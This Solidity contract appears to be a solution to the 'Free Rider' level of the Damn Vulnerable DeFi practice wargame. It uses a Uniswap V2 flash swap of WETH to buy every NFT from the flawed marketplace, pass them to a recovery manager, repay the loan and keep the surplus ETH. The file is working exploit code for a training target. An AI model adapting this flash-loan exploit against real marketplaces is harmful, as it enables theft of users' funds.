// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {console} from "forge-std/Console.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {WETH} from "solmate/tokens/WETH.sol";

import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract FlashSwapper is IUniswapV2Callee, IERC721Receiver {
    address public immutable FACTORY;
    WETH public immutable WETH_TOKEN;
    FreeRiderNFTMarketplace public immutable MARKETPLACE;
    address public immutable RECOVERY_MANAGER;

    constructor(
        address _factory,
        address weth,
        address _marketplace,
        address _recoveryManager
    ) {
        FACTORY = _factory;
        WETH_TOKEN = WETH(payable(weth));
        MARKETPLACE = FreeRiderNFTMarketplace(payable(_marketplace));
        RECOVERY_MANAGER = _recoveryManager;
    }

    // The function to initiate the flash swap
    function startFlashSwap(address _tokenBorrow, uint _amount) external {
        console.log("Starting flash swap");
        address pair = IUniswapV2Factory(FACTORY).getPair(
            _tokenBorrow,
            address(WETH_TOKEN)
        );
        require(pair != address(0), "Pair doesn't exist");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        uint amount0Out = address(WETH_TOKEN) == token0 ? _amount : 0;
        uint amount1Out = address(WETH_TOKEN) == token1 ? _amount : 0;

        // Need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(address(WETH_TOKEN), _amount);
        console.log("Borrowing %s %s", _amount, address(WETH_TOKEN));
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = msg.sender;

        require(sender == address(this), "Sender must be this contract");
        require(
            msg.sender == IUniswapV2Factory(FACTORY).getPair(token0, token1),
            "Msg sender must be pair"
        );

        (address tokenBorrow, uint amount) = abi.decode(data, (address, uint));
        console.log("Token borrowed: %s", tokenBorrow);

        // Unwrap WETH to ETH
        WETH_TOKEN.withdraw(amount);
        console.log("Unwrapped WETH to ETH amount: ", address(this).balance);

        // Buy all NFTs from the marketplace
        uint256[] memory nftIds = new uint256[](6);
        nftIds[0] = 0;
        nftIds[1] = 1;
        nftIds[2] = 2;
        nftIds[3] = 3;
        nftIds[4] = 4;
        nftIds[5] = 5;
        MARKETPLACE.buyMany{value: amount}(nftIds);

        bytes memory data = abi.encode(address(this));
        // Transfer NFT to recovery manager
        DamnValuableNFT nft = MARKETPLACE.token();
        for (uint i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), RECOVERY_MANAGER, i, data);
        }

        // Transfer all NFTs to the recovery manager
        // -> Will be done in the callback from the ERC721 transfer

        console.log(
            "Weth balance before",
            IERC20(tokenBorrow).balanceOf(address(this))
        );
        console.log("Wrapping %s ETH to WETH", address(this).balance);
        

        // Calculate amount to repay
        uint fee = ((amount * 3) / 997) + 1;
        uint amountToRepay = amount + fee;
        // Rewrap ETH to WETH
        WETH_TOKEN.deposit{value: amountToRepay}();

        console.log(
            "Weth balance after",
            IERC20(tokenBorrow).balanceOf(address(this))
        );

        require(
            IERC20(tokenBorrow).balanceOf(address(this)) >= amount,
            "Not enough tokens borrowed"
        );

        

        // Repay borrowed tokens
        IERC20(tokenBorrow).transfer(pair, amountToRepay);

        // Send remaining tokens to the player
        tx.origin.call{value: address(this).balance}("");
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory _data
    ) external override returns (bytes4) {
        console.log("NFT received: %s", _tokenId);
        // Encode the receiver of the bounty

        return IERC721Receiver.onERC721Received.selector;
    }

    // Needed to receive ETH from unwrapping
    receive() external payable {
        console.log("Received %s ETH", msg.value);
    }
}
